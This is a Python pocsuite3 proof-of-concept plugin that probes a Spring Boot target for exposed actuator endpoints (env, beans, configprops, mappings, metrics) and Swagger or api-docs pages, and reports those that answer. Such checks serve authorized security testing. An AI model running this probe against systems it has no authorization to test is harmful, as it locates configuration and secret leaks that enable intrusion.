#!/usr/bin/env python
# -*- coding: utf-8 -*-
import json
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = 'hancool'
    vulDate = ''
    createDate = '2021-2-4'
    updateDate = '2021-2-4'
    references = [
        'https://github.com/LandGrey/SpringBootVulExploit']
    name = 'SpringBoot unauthorized info'
    appPowerLink = 'https://spring.io/projects/spring-boot'
    appName = 'SpringBoot'
    appVersion = 'all'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
            SpringBoot可能由于配置不当，导致相关接口、配置等信息泄露；
            根据最容易出现的配置情况和实际可利用的信息，筛选的精简测试字典。
    '''
    samples = ['127.0.0.1']

    def _verify(self):
        result = {}
        # 测试路径和接口字典：
        dir_path = ('', 'actuator', 'moniter')
        dir_file_list = ('mappings', 'metrics', 'beans', 'configprops', 'env')
        api_filie_list = ('swagger-ui.html', 'api-docs', 'v2/api-docs')
        result_verified_url = []
        # 测试sprintboot actuator
        for path in dir_path:
            for file_name in dir_file_list:
                url_list = []
                url_list.append(self.url)
                if not self.url.endswith('/'):
                    url_list.append('/')
                if path:
                    url_list.append(path + '/')
                url_list.append(file_name)
                url = ''.join(url_list)
                try:
                    r = req.get(url)
                    if r.status_code == 200:
                        try:
                            # 正常情况下返回是JSON格式
                            json.loads(r.text)
                            result_verified_url.append(
                                '{}/{}'.format(path, file_name))
                        except:
                            pass
                except:
                    pass
            # 一般来说只会配置一个web prefix，所以如果测试有就不尝试其它目录了
            if len(result_verified_url) > 0:
                break
        # 测试api、swagger：
        for file_name in api_filie_list:
            if self.url.endswith('/'):
                url = self.url + file_name
            else:
                url = self.url + '/' + file_name
            try:
                r = req.get(url)
                if r.status_code == 200:
                    result_verified_url.append(file_name)
            except:
                pass

        if len(result_verified_url) > 0:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['extra'] = {}
            result['extra']['evidence'] = '\r\n'.join(result_verified_url)

        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("not vulnerability")
        return output


register_poc(TestPOC)
